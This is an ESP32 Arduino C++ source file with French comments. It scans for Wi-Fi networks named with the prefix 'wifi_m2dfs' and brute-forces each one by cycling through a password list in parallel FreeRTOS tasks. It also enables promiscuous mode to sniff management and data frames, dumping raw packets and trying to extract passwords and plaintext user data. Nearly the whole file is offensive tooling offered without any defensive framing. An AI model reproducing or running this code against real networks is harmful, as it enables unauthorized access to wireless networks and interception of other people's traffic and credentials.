#include <Arduino.h>
#include <WiFi.h>
#include <vector>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include "wifi_hotspot.h"


#define MAX_SSIDS 50
static const char* foundSSIDs[MAX_SSIDS];
static int foundSSIDCount = 0;

bool ssidTested[MAX_SSIDS] = {false}; // Suivi des SSIDs déjà testés
bool connectionResult = false;       // Résultat de la connexion globale
TaskHandle_t ssidTaskHandles[MAX_SSIDS] = {nullptr}; // Gestion des tâches pour chaque SSID

// Déclaration des mots de passe


void scanNetworks() {
    Serial.println("Scanning for networks...");
    int n = WiFi.scanNetworks();
    foundSSIDCount = 0;

    if (n <= 0) {
        Serial.println(n == 0 ? "No networks found" : "WiFi scan failed");
    } else {
        for (int i = 0; i < n && foundSSIDCount < MAX_SSIDS; ++i) {
            String ssid = WiFi.SSID(i);
            if (ssid.startsWith("wifi_m2dfs")) {
                foundSSIDs[foundSSIDCount++] = strdup(ssid.c_str());
                Serial.printf("%d: %s (RSSI: %d)\n", foundSSIDCount, ssid.c_str(), WiFi.RSSI(i));
            }
        }
    }
}


const char** getFoundSSIDs() {
    return foundSSIDs;
}

int getFoundSSIDCount() {
    return foundSSIDCount;
}
String extractSSIDFromPacket(const uint8_t* data, int len) {
    if (len < 36) return ""; // Taille minimale pour un paquet valide
    int ssidLen = data[25];  // Longueur du SSID dans ces paquets spécifiques
    if (ssidLen <= 0 || ssidLen > 32 || 26 + ssidLen > len) return ""; // SSID non valide
    return String((const char*)&data[26], ssidLen); // Extraire le SSID
}

// Fonction pour vérifier si un SSID est dans la liste cible
bool isSSIDTarget(const String& ssid) {
    const char** foundSSIDs = getFoundSSIDs();
    int foundSSIDCount = getFoundSSIDCount();

    for (int i = 0; i < foundSSIDCount; i++) {
        if (ssid == String(foundSSIDs[i])) {
            return true; // SSID trouvé dans la liste cible
        }
    }
    return false;
}

// Fonction pour extraire un mot de passe ou des données supplémentaires
String extractPassword(const uint8_t* data, int len, int offset) {
    String potentialPassword;
    for (int i = offset; i < len; i++) {
        if (isPrintable(data[i])) {
            potentialPassword += (char)data[i];
        } else {
            break; // Fin des caractères imprimables
        }
    }
    return potentialPassword;
}

// Fonction pour traiter les paquets Authentication/Association Request
void processConnectionPacket(const uint8_t* data, int len, uint8_t subType) {
    Serial.printf("Paquet capturé, sous-type : %02X\n", subType);

    // Affichez les données brutes pour valider la structure
    Serial.print("Données brutes du paquet : ");
    for (int i = 0; i < len; i++) {
        Serial.printf("%02X ", data[i]);
    }
    Serial.println();

    // Extraction du SSID uniquement pour Association Request (0x00)
    String ssid;
    if (subType == 0x00) {
        int ssidLen = data[25]; // Longueur du SSID
        if (ssidLen > 0 && ssidLen <= 32 && (26 + ssidLen) <= len) {
            ssid = String((const char*)&data[26], ssidLen); // SSID
        }
    }

    if (!ssid.isEmpty()) {
        Serial.printf("SSID extrait : %s\n", ssid.c_str());
    } else {
        Serial.println("SSID extrait : Aucun");
    }

    // Extraction des données supplémentaires (potentiellement un mot de passe)
    String password;
    if (subType == 0x00) { // Association Request
        int offset = 26 + ssid.length(); // Offset après le SSID
        password = extractPassword(data, len, offset);
    }

    if (!password.isEmpty()) {
        Serial.printf("Mot de passe capturé : %s\n", password.c_str());
    } else {
        Serial.println("Aucun mot de passe capturé.");
    }
}




// Callback pour traiter les paquets capturés
void snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return; // Traiter uniquement les paquets de gestion et de données

    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    const uint8_t* payload = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;

    // Identifier le type de sous-trame
    uint8_t frameControl = payload[0];
    uint8_t subType = (frameControl >> 4) & 0x0F;

    // Ignorer les Beacon Frames (sous-type 0x08)
    if (subType == 0x08) {
        return; // Ne pas traiter les Beacon Frames
    }

    // Afficher les informations du paquet capturé
    Serial.printf("Paquet capturé, type : %d, sous-type : %02X\n", type, subType);

    // Afficher les données brutes pour analyse
    Serial.print("Données brutes du paquet : ");
    for (int i = 0; i < len; i++) {
        Serial.printf("%02X ", payload[i]);
    }
    Serial.println();
}



// Fonction pour analyser les données utilisateur dans un Data Frame
void processDataFrame(const uint8_t* data, int len) {
    Serial.println("Analyse des données du Data Frame :");

    // Extraire les adresses MAC
    String macSource = extractMAC(data, 10);
    String macDest = extractMAC(data, 4);

    Serial.printf("MAC Source : %s\n", macSource.c_str());
    Serial.printf("MAC Destination : %s\n", macDest.c_str());

    // Rechercher un mot de passe dans les données utilisateur (décodage HTTP)
    Serial.print("Recherche de mot de passe dans les données utilisateur : ");
    int dataOffset = 24; // Offset typique des données utilisateur dans un Data Frame
    for (int i = dataOffset; i < len; i++) {
        if (isPrintable(data[i])) {
            Serial.print((char)data[i]);
        } else {
            Serial.print(".");
        }
    }
    Serial.println();
}

// Fonction pour extraire une adresse MAC
String extractMAC(const uint8_t* data, int offset) {
    char mac[18];
    sprintf(mac, "%02X:%02X:%02X:%02X:%02X:%02X",
            data[offset], data[offset + 1], data[offset + 2],
            data[offset + 3], data[offset + 4], data[offset + 5]);
    return String(mac);
}

// Initialisation du mode promiscuous
void initializePromiscuousMode() {
    Serial.println("Initialisation du mode promiscuous...");
    esp_wifi_set_promiscuous(true); // Activer le mode promiscuous
    esp_wifi_set_promiscuous_rx_cb(snifferCallback); // Définir le callback
    Serial.println("Mode promiscuous activé.");
}

bool testPassword(const char* ssid, const String& password) {
    Serial.printf("Testing SSID: %s with Password: %s\n", ssid, password.c_str());
    unsigned long startAttemptTime = millis();

    WiFi.begin(ssid, password.c_str());
    while (WiFi.status() != WL_CONNECTED && millis() - startAttemptTime < 1000) {
        delay(10); // Vérification active
    }

    if (WiFi.status() == WL_CONNECTED) {
        Serial.printf("Successfully connected to %s with Password: %s\n", ssid, password.c_str());
        WiFi.disconnect(true);
        return true;
    } else {
        Serial.printf("Failed to connect to %s with Password: %s\n", ssid, password.c_str());
        return false;
    }
}

void testPasswords(const char* ssidList[], int ssidCount) {
    int passwordCount = passwords.size(); // Utilisation directe de la liste extern
    bool ssidTested[ssidCount] = {false}; // Suivi des SSIDs testés
    unsigned long totalStartTime = millis(); // Démarrer le chronomètre global

    for (int middle = passwordCount / 2, step = 1; step <= middle; ++step) {
        for (int i = 0; i < ssidCount; ++i) {
            if (ssidTested[i]) continue; // Ignorer les SSIDs déjà testés

            const char* ssid = ssidList[i];
            Serial.printf("Testing SSID: %s\n", ssid);

            // Tester d'abord le mot de passe à gauche
            String passwordLeft = passwords[middle - step];
            if (testPassword(ssid, passwordLeft)) {
                ssidTested[i] = true;
                continue;
            }

            // Puis tester le mot de passe à droite
            String passwordRight = passwords[middle + step];
            if (testPassword(ssid, passwordRight)) {
                ssidTested[i] = true;
                continue;
            }
        }

        // Vérifier si tous les SSIDs ont été testés
        bool allSSIDsTested = true;
        for (int i = 0; i < ssidCount; ++i) {
            if (!ssidTested[i]) {
                allSSIDsTested = false;
                break;
            }
        }
        if (allSSIDsTested) break; // Arrêter les tests si tout est terminé
    }

    unsigned long totalTime = (millis() - totalStartTime) / 1000;
    Serial.printf("Total time taken for testing all SSIDs: %lu seconds\n", totalTime);
}

void ssidTask(void* parameter) {
    int ssidIndex = (int)parameter;
    const char* ssid = foundSSIDs[ssidIndex];
    int passwordCount = passwords.size();  // Utiliser passwords

    int middle = passwordCount / 2;

    // Tester en commençant par le milieu
    if (!ssidTested[ssidIndex] && testPassword(ssid, passwords[middle])) {
        vTaskDelete(nullptr); // Terminer la tâche si réussi
        return;
    }

    // Tester en alternant autour du milieu
    for (int left = middle - 1, right = middle + 1; left >= 0 || right < passwordCount; --left, ++right) {
        if (left >= 0 && !ssidTested[ssidIndex] && testPassword(ssid, passwords[left])) {
            vTaskDelete(nullptr);
            return;
        }
        if (right < passwordCount && !ssidTested[ssidIndex] && testPassword(ssid, passwords[right])) {
            vTaskDelete(nullptr);
            return;
        }
    }

    // Si tous les mots de passe ont échoué
    Serial.printf("No password worked for SSID: %s\n", ssid);
    vTaskDelete(nullptr); // Terminer la tâche
}


void testAllSSIDs() {
    for (int i = 0; i < foundSSIDCount; ++i) {
        if (ssidTaskHandles[i] == nullptr) {
            xTaskCreatePinnedToCore(ssidTask, "SSIDTask", 4096, (void*)i, 1, &ssidTaskHandles[i], 0);
        }
    }

    // Attendre que toutes les tâches soient terminées
    for (int i = 0; i < foundSSIDCount; ++i) {
        if (ssidTaskHandles[i] != nullptr) {
            vTaskDelay(100 / portTICK_PERIOD_MS); // Donne un peu de temps aux tâches
            while (eTaskGetState(ssidTaskHandles[i]) != eDeleted) {
                vTaskDelay(100 / portTICK_PERIOD_MS); // Attendre la fin de la tâche
            }
        }
    }

    Serial.println("All SSIDs tested.");
}
